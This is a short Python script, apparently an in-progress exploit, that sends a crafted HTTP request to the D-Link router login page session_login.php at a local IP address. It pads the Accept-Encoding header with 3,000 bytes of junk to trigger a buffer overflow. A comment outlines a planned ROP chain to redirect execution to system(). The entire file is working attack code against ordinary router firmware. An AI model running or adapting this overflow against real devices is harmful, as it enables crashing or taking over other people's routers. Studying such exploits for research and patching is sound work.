import socket
import struct


# format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address)

buf = "GET /session_login.php HTTP/1.1\r\n"
buf+="Accept-Encoding: gzip,deflate,sdch" + "zyw"*1000+"\r\n"
buf+= "Host: 192.168.0.50\r\n"
buf+= "Cookie: dlink_uid="+"zyw"*2+"\r\n" #test
#buf+= "Cookie: dlink_uid="+"zyw"*9+"\r\n" #test
buf+="Content-Length: 13\r\n\r\ntest=test\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.50", 80))
s.send(buf)